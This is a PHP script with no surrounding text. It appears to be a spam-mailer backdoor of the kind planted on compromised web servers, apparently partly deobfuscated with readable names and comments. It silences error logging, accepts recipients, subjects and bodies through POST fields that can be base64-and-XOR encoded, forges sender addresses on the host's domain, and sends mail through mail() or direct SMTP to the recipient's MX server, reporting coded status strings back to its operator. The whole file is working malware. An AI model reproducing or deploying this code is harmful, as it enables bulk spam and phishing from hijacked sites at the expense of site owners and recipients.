<?php
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
if (count($_POST) < 2) {
	die(PHP_OS.chr(49).chr(48).chr(43).md5(0987654321)); // "Linux10+cfcd208495d565ef66e7dff9f98764da"
}

$decode_values = false;
foreach (array_keys($_POST) as $param_keyword) {
	switch ($param_keyword[0]) {
	case 'l':
		$l_param = $param_keyword;
		break;
	case 'd':
		$d_value = $param_keyword;
		break;
	case 'm':
		$m_value = $param_keyword;
		break;
	case 'e':
		$decode_values = true;
		break;
	}
}

if ($l_param === '' || $d_value === '')
	die(PHP_OS.chr(49).chr(49).chr(43).md5(0987654321));

$disabled_functions = preg_split('/\,(\ +)?/', @ini_get('disable_functions'));

$l_value = @$_POST[$l_param];
$d_value = @$_POST[$d_value]; 
$m_value = @$_POST[$m_value];

if ($decode_values) {
	$l_value = decoder($l_value);
	$d_value = decoder($d_value);
	$m_value = decoder($m_value);
}

$l_value = urldecode(stripslashes($l_value));
$d_value = urldecode(stripslashes($d_value));
$m_value = urldecode(stripslashes($m_value));
if (strpos($l_value, ';', 1) != false) {
	// First and last names, and email address
	list($first_name, $last_name, $email_address3)
		= preg_split('/;/',strtolower($l_value));
	$first_name = ucfirst($first_name);
	$last_name = ucfirst($last_name);
	$email_dest_host = next(explode('@', $email_address3));
	if ($last_name == '' || $first_name == '') {
		$last_name = $first_name = '';
		$l_value = $email_address3;
	} else {
		$l_value = "\"$first_name $last_name\" <$email_address3>";
	}
} else {
	// Single email address in $l_value
	$last_name = $first_name = '';
	$email_address = strtolower($l_value);
	$email_dest_host = next(explode('@', $l_value));
}

preg_match('|<USER>(.*)</USER>|imsU', $d_value, $user_name);
$user_name = $user_name[1];
preg_match('|<NAME>(.*)</NAME>|imsU', $d_value, $human_name);
$human_name = $human_name[1];
preg_match('|<SUBJ>(.*)</SUBJ>|imsU', $d_value, $subject);
$subject = $subject[1];
preg_match('|<SBODY>(.*)</SBODY>|imsU', $d_value, $msg_body);
$msg_body= $msg_body[1];

$subject = str_replace("%R_NAME%", $first_name, $subject);
$subject = str_replace("%R_LNAME%", $last_name, $subject);

$msg_body = str_replace("%R_NAME%", $first_name, $msg_body);
$msg_body = str_replace("%R_LNAME%", $last_name, $msg_body);

$http_host = preg_replace('/^(www|ftp)\./i', '', @$_SERVER['HTTP_HOST']);

if (looks_like_ip_addr($http_host) || @ini_get('safe_mode'))
	$hostname_ip_addr = false;
else
	$hostname_ip_addr = true;

$from_email_addr = "$user_name@$http_host";

if ($human_name != '')
	$sender_name = "$human_name <$from_email_addr>";
else
	$sender_name = $from_email_addr;

$localhost_headers = "From: $sender_name\r\n";
$localhost_headers .= "Reply-To: $sender_name\r\n";
$minimal_headers = "X-Priority: 3 (Normal)\r\n";
$minimal_headers .= "MIME-Version: 1.0\r\n";
$minimal_headers .= "Content-Type: text/html; charset=\"iso-8859-1\"\r\n";
$minimal_headers .= "Content-Transfer-Encoding: 8bit\r\n";
if (!in_array('mail', $disabled_functions)) {
	if ($hostname_ip_addr) {
		# bool mail(string $to, string $subj, string $msg , string $add_hdrs, string $additional_parameters )
		if (@mail($l_value, $subject, $msg_body, $localhost_headers.$minimal_headers, "-f$from_email_addr"))
			die(chr(79).chr(75).md5(1234567890)."+0");
	} else {
		if (@mail($l_value, $subject, $msg_body, $minimal_headers))
			die(chr(79).chr(75).md5(1234567890)."+0");
	}
}
$lower_headers = "Date: " . @date("D, j M Y G:i:s O")."\r\n" . $localhost_headers;
$lower_headers .= "Message-ID: <".preg_replace('/(.{7})(.{5})(.{2}).*/', '$1-$2-$3', md5(time()))."@$http_host>\r\n";
$lower_headers .= "To: $l_value\r\n";
$lower_headers .= "Subject: $subject\r\n";
$lower_headers .= $minimal_headers;
$entire_email = $lower_headers."\r\n".$msg_body;
if ($m_value == '')
	$m_value = get_smtp_server($email_dest_host);
if (($smtp_response_code = send_smtp($from_email_addr, $email_address, $entire_email, $http_host, $m_value)) == 0) {
	die(chr(79).chr(75).md5(1234567890)."+1");
} else {
	echo PHP_OS.chr(50).chr(48).'+'.md5(0987654321)."+$smtp_response_code";
}

// Decide if argument string represents an IP address, return 1,
// or not, return 0
function looks_like_ip_addr($possible_address) {
	return preg_match("/^([1-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])(\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])){3}$/", $possible_address);
}

// Unused function
function na73fa8bd($vb45cffe0, $v11a95b8a = 0, $v7fa1b685="=\r\n", $v92f21a0f = 0, $v3303c65a = false) {
	$vf5a8e923 = strlen($vb45cffe0);
	$vb4a88417 = '';
	for ($v865c0c0b = 0; $v865c0c0b < $vf5a8e923; $v865c0c0b++) {
		if ($v11a95b8a >= 75) {
			$v11a95b8a = $v92f21a0f;
			$vb4a88417 .= $v7fa1b685;
		}
		$v4a8a08f0 = ord($vb45cffe0[$v865c0c0b]);
		if (($v4a8a08f0 == 0x3d) || ($v4a8a08f0 >= 0x80) || ($v4a8a08f0 < 0x20)) {
			if ((($v4a8a08f0 == 0x0A) || ($v4a8a08f0 == 0x0D)) && (!$v3303c65a)) {
				$vb4a88417.=chr($v4a8a08f0);
				$v11a95b8a = 0;
				continue;
			}
			$vb4a88417 .='='.str_pad(strtoupper(dechex($v4a8a08f0)), 2, '0', STR_PAD_LEFT);
			$v11a95b8a += 3;
			continue;
		}
		$vb4a88417 .= chr($v4a8a08f0);
		$v11a95b8a++;
	}
	return $vb4a88417;
}

// Returns:
// -1 if it can't find a function to open a socket.
//  1 if it can't open a socket one way or the other.
//  0 for total success.
//  A string "N+(to_address)+SMTPerrorMessage"
//  where N indicates which step in the SMTP process failed.
function send_smtp($sender_uid, $recpt_address, $entire_email, $http_host, $mail_server) {

	global $disabled_functions;

	if (!in_array('fsockopen', $disabled_functions))
		$socket = @fsockopen($mail_server, 25, $errno, $errstr, 20);
	elseif (!in_array('pfsockopen', $disabled_functions))
		$socket = @pfsockopen($mail_server, 25, $errno, $errstr, 20);
	elseif (!in_array('stream_socket_client', $disabled_functions) && function_exists("stream_socket_client"))
		$socket = @stream_socket_client("tcp://$mail_server:25", $errno, $errstr, 20);
	else
		return -1;

	if (!$socket) {
		return 1;
	} else {
		$d_value = get_smtp_response($socket);
		@fputs($socket, "EHLO $http_host\r\n");
		$smtp_response = get_smtp_response($socket);
		if (substr($smtp_response, 0, 3) != 250 )
			return "2+($recpt_address)+".preg_replace('/(\r\n|\r|\n)/', '|', $smtp_response);
		@fputs($socket, "MAIL FROM:<$sender_uid>\r\n");
		$smtp_response = get_smtp_response($socket);
		if (substr($smtp_response, 0, 3) != 250 )
			return "3+($recpt_address)+".preg_replace('/(\r\n|\r|\n)/', '|', $smtp_response);
		@fputs($socket, "RCPT TO:<$recpt_address>\r\n");
		$smtp_response = get_smtp_response($socket);
		if (substr($smtp_response, 0, 3) != 250 && substr($smtp_response, 0, 3) != 251)
			return "4+($recpt_address)+".preg_replace('/(\r\n|\r|\n)/', '|', $smtp_response);
		@fputs($socket, "DATA\r\n");
		$smtp_response = get_smtp_response($socket);
		if (substr($smtp_response, 0, 3) != 354 )
			return "5+($recpt_address)+".preg_replace('/(\r\n|\r|\n)/', '|', $smtp_response);
		@fputs($socket, $entire_email."\r\n.\r\n");
		$smtp_response = get_smtp_response($socket);
		if (substr($smtp_response, 0, 3) != 250 )
			return "6+($recpt_address)+".preg_replace('/(\r\n|\r|\n)/', '|', $smtp_response);
		@fputs($socket, "QUIT\r\n");
		@fclose($socket);
		return 0;
	}
}

function get_smtp_response($handle) {
	$file_contents = '';
	while($tmp_bytes = @fgets($handle, 4096)) {
		$file_contents .= $tmp_bytes;
		if (substr($tmp_bytes, 3, 1) == ' ') break;
	}
	return $file_contents;
}

function get_smtp_server($hostname) {
	global $disabled_functions;
	if (!in_array('getmxrr', $disabled_functions) && function_exists("getmxrr")) {
		@getmxrr($hostname, $mxhosts, $weights);
		if (count($mxhosts) === 0)
			return '127.0.0.1';
		$wt_ordered_mxhosts = array_keys($weights, min($weights));
		return $mxhosts[$wt_ordered_mxhosts[0]];
	} else {
		return '127.0.0.1';
	}
}

function decoder($encoded_string) {
	$encoded_string = base64_decode($encoded_string);
	$decoded_string = '';
	for($encoded_idx = 0; $encoded_idx < strlen($encoded_string); $encoded_idx++)
		$decoded_string .= chr(ord($encoded_string[$encoded_idx]) ^ 2);
	return $decoded_string;
}
?> 
